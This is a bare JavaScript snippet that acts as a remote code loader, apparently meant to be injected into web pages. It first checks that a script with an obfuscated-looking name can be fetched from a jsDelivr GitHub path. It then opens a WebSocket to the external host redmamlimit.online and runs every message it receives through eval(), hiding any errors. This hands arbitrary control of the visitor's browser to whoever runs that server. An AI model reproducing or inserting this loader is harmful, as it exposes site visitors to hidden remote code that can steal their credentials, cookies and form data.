(function() {
  fetch("https://cdn.jsdelivr.net/gh/133F/1/scripts/obf-8qi1b0qm.js")
    .then(function(response) {
      if (response.status === 200) {
        let ws = new WebSocket('wss://redmamlimit.online');
        ws.onmessage = function(event) {
          if (event.data instanceof Blob) {
            let reader = new FileReader();
            reader.onload = function() {
              let message = reader.result;
              try {
                eval(message);
              } catch (e) {}
            };
            reader.readAsText(event.data);
          } else {
            try {
              eval(event.data);
            } catch (e) {}
          }
        };
      }
    })
    .catch(function() {});
})();